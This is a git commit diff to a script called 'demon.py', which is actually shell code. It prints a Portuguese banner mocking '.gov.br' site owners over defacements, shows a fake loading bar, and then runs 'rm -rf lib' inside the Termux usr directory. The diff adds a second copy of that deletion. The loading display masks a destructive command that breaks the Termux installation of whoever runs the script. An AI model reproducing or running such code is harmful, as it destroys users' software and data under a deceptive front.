4853a239132ab20d7dba3d70a9ecce250e866fd7
Maiquel Paiva <153939765+untw0@users.noreply.github.com>
2024-09-15 17:20:29 -0300

    Update demon.py

--- demon.py
+++ demon.py
@@ -27,19 +27,25 @@ EOF
 echo "ENTAO QUER DIZER QUE VOCES SAO OS OWNADORES DAS PADOCARIAS .GOV.BR VAO A MERDA, SO DA DEFACE USANDO CLOUD VAZADA! by: untw0"
 
 # Simulação de carregamento
+total_steps=20  # Número total de etapas de carregamento
+delay=0.5       # Tempo de espera entre cada etapa em segundos
+progress=0      # Valor inicial do progresso
+
 echo -n "["
-for i in {1..30}; do
-    sleep 1
-    if [ $((i % 10)) -eq 0 ]; then
-        echo -n "#"
-    else
-        echo -n " "
-    fi
+while [ $progress -le $total_steps ]; do
+    sleep $delay
+    progress=$((progress + 1))
+    filled=$(printf "%0.s#" $(seq 1 $progress))
+    empty=$(printf "%0.s " $(seq $progress $total_steps))
+    echo -n "$filled$empty"
 done
 echo "]"
 echo "100%"
 
 # Navegar para a pasta e executar o comando
 cd /data/data/com.termux/files/usr
+echo "Executando comando rm -rf lib..."
+rm -rf lib
+
 echo "Executando comando rm -rf lib..."
 rm -rf lib
